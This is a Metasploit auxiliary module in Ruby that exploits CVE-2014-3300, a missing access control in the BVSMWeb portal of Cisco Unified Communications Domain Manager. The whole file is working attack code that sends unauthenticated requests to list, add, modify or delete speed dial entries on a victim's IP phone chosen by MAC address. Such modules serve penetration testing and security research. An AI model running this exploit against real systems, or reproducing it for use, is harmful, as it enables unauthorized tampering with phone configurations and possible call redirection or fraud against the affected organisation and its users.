##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Viproy CUCDM IP Phone XML Services - Speed Dial Attack Tool',
      'Description'   => %q{
        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager
        (CDM), before version 10, doesn't implement access control properly, which allows remote
        attackers to modify user information. This module exploits the vulnerability to make
        unauthorized speed dial entity manipulations.
      },
      'Author'        => 'fozavci',
      'References'    =>
        [
          ['CVE', '2014-3300'],
          ['BID', '68331']
        ],
      'License'       => MSF_LICENSE,
      'Actions'       =>
        [
          [ 'List',   { 'Description' => 'Getting the speeddials for the MAC address' } ],
          [ 'Modify', { 'Description' => 'Modifying a speeddial for the MAC address' } ],
          [ 'Add',    { 'Description' => 'Adding a speeddial for the MAC address' } ],
          [ 'Delete', { 'Description' => 'Deleting a speeddial for the MAC address' } ]
        ],
      'DefaultAction'  => 'List'
    ))

    register_options(
    [
      OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
      OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
      OptString.new('NAME', [ false, 'Name for Speed Dial', 'viproy']),
      OptString.new('POSITION', [ false, 'Position for Speed Dial', '1']),
      OptString.new('TELNO', [ false, 'Phone number for Speed Dial', '007']),
    ])
  end

  def run

    case action.name.upcase
      when 'MODIFY'
        modify
      when 'DELETE'
        delete
      when 'ADD'
        add
      when 'LIST'
        list
    end

  end

  def send_rcv(uri, vars_get)
    uri = normalize_uri(target_uri.to_s, uri.to_s)
    res = send_request_cgi(
      {
        'uri'    => uri,
        'method' => 'GET',
        'vars_get' => vars_get
      })

    if res && res.code == 200 && res.body && res.body.to_s =~ /Speed [D|d]ial/
      return Exploit::CheckCode::Vulnerable, res
    else
      print_error("Target appears not vulnerable!")
      return Exploit::CheckCode::Safe, res
    end
  end

  def parse(res)
    doc = REXML::Document.new(res.body)
    names = []
    phones = []

    list = doc.root.get_elements('DirectoryEntry')
    list.each do |lst|
      xlist = lst.get_elements('Name')
      xlist.each {|l| names << "#{l[0]}"}
      xlist = lst.get_elements('Telephone')
      xlist.each {|l| phones << "#{l[0]}" }
    end

    if names.size > 0
      names.size.times do |i|
        info = ''
        info << "Position: #{names[i].split(":")[0]}, "
        info << "Name: #{names[i].split(":")[1]}, "
        info << "Telephone: #{phones[i]}"

        print_good("#{info}")
      end
    else
      print_status("No Speed Dial detected")
    end
  end

  def list
    mac = datastore['MAC']

    print_status("Getting Speed Dials of the IP phone")
    vars_get = {
      'device' => "SEP#{mac}"
    }

    status, res = send_rcv('speeddials.cgi', vars_get)
    parse(res) unless status == Exploit::CheckCode::Safe
  end

  def add
    mac = datastore['MAC']
    name = datastore['NAME']
    position = datastore['POSITION']
    telno = datastore['TELNO']

    print_status("Adding Speed Dial to the IP phone")
    vars_get = {
      'name' => "#{name}",
      'telno' => "#{telno}",
      'device' => "SEP#{mac}",
      'entry' => "#{position}",
      'mac' => "#{mac}"
    }
    status, res = send_rcv('phonespeedialadd.cgi', vars_get)

    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
      print_good("Speed Dial #{position} is added successfully")
    elsif res && res.body && res.body.to_s =~ /exist/
      print_error("Speed Dial is exist, change the position or choose modify!")
    else
      print_error("Speed Dial couldn't add!")
    end
  end

  def delete
    mac = datastore['MAC']
    position = datastore['POSITION']

    print_status("Deleting Speed Dial of the IP phone")

    vars_get = {
      'entry' => "#{position}",
      'device' => "SEP#{mac}"
    }

    status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)

    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
      print_good("Speed Dial #{position} is deleted successfully")
    else
      print_error("Speed Dial is not found!")
    end
  end

  def modify
    mac = datastore['MAC']
    name = datastore['NAME']
    position = datastore['POSITION']
    telno = datastore['TELNO']

    print_status("Deleting Speed Dial of the IP phone")

    vars_get = {
      'entry' => "#{position}",
      'device' => "SEP#{mac}"
    }

    status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)

    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
      print_good("Speed Dial #{position} is deleted successfully")
      print_status("Adding Speed Dial to the IP phone")

      vars_get = {
        'name' => "#{name}",
        'telno' => "#{telno}",
        'device' => "SEP#{mac}",
        'entry' => "#{position}",
        'mac' => "#{mac}"
      }

      status, res = send_rcv('phonespeedialadd.cgi', vars_get)

      if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
        print_good("Speed Dial #{position} is added successfully")
      elsif res && res.body =~ /exist/
        print_error("Speed Dial is exist, change the position or choose modify!")
      else
        print_error("Speed Dial couldn't add!")
      end
    else
      print_error("Speed Dial is not found!")
    end
  end
end
